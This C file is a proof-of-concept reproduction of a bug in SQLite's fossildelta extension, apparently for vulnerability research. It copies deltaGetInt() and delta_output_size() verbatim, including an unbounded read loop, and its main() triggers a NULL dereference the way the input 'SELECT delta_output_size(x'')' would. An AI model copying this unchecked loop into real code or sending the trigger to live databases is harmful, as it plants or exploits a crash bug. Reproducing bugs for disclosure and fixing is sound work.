/*
** Reproduces the vulnerable deltaGetInt()/delta_output_size() shape from
** ext/misc/fossildelta.c AS IT EXISTED at the pinned oracle commit
** b1a73ba34d05b32007315e4065c6468cc638e3af (2026-02-24), copied verbatim
** below. deltaGetInt() has NO length bound in its while loop:
**   while( (c = zValue[0x7f&*(z++)])>=0 ){ v = (v<<6) + c; }
** it just walks memory until it finds a byte whose zValue lookup is
** negative -- it never consults *pLen inside the loop at all.
**
** deltaOutputSizeFunc() (the SQL function `delta_output_size(D)`) guards
** against a SQL NULL argument (sqlite3_value_type==SQLITE_NULL) but not
** against a zero-length non-NULL BLOB: sqlite3_value_blob() returns NULL
** for ANY zero-length blob per vdbeapi.c's `return p->n ? p->z : 0;`, SQL
** NULL or not. So `SELECT delta_output_size(x'')` reaches deltaGetInt()
** with aDelta=NULL, and deltaGetInt() dereferences it directly with no
** NULL/length check -- `zValue[0x7f & *(NULL)]` -- before *pLen is ever
** consulted.
*/
#include <stdio.h>

static const signed char zValue[] = {
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
  -1, -1, -1, -1, -1, -1, -1, -1,   -1, -1, -1, -1, -1, -1, -1, -1,
   0,  1,  2,  3,  4,  5,  6,  7,    8,  9, -1, -1, -1, -1, -1, -1,
  -1, 10, 11, 12, 13, 14, 15, 16,   17, 18, 19, 20, 21, 22, 23, 24,
  25, 26, 27, 28, 29, 30, 31, 32,   33, 34, 35, -1, -1, -1, -1, 36,
  -1, 37, 38, 39, 40, 41, 42, 43,   44, 45, 46, 47, 48, 49, 50, 51,
  52, 53, 54, 55, 56, 57, 58, 59,   60, 61, 62, -1, -1, -1, 63, -1,
};

/* verbatim from the pinned commit's ext/misc/fossildelta.c */
static unsigned int deltaGetInt(const char **pz, int *pLen){
  unsigned int v = 0;
  int c;
  unsigned char *z = (unsigned char*)*pz;
  unsigned char *zStart = z;
  while( (c = zValue[0x7f&*(z++)])>=0 ){
     v = (v<<6) + c;
  }
  z--;
  *pLen -= z - zStart;
  *pz = (char*)z;
  return v;
}

/* verbatim from the pinned commit */
static int delta_output_size(const char *zDelta, int lenDelta){
  int size;
  size = deltaGetInt(&zDelta, &lenDelta);
  if( lenDelta<=0 || *zDelta!='\n' ){
    return -1;
  }
  return size;
}

int main(void){
  /* simulates: SELECT delta_output_size(x'');
  ** sqlite3_value_blob() on a zero-length (but non-NULL) blob returns
  ** NULL; sqlite3_value_bytes() returns 0. */
  const char *aDelta = 0;
  int nDelta = 0;

  printf("calling delta_output_size(NULL, 0), as deltaOutputSizeFunc() "
         "would for SELECT delta_output_size(x'')...\n");
  int nOut = delta_output_size(aDelta, nDelta);
  printf("nOut = %d (unreachable if deltaGetInt crashed first)\n", nOut);
  return 0;
}
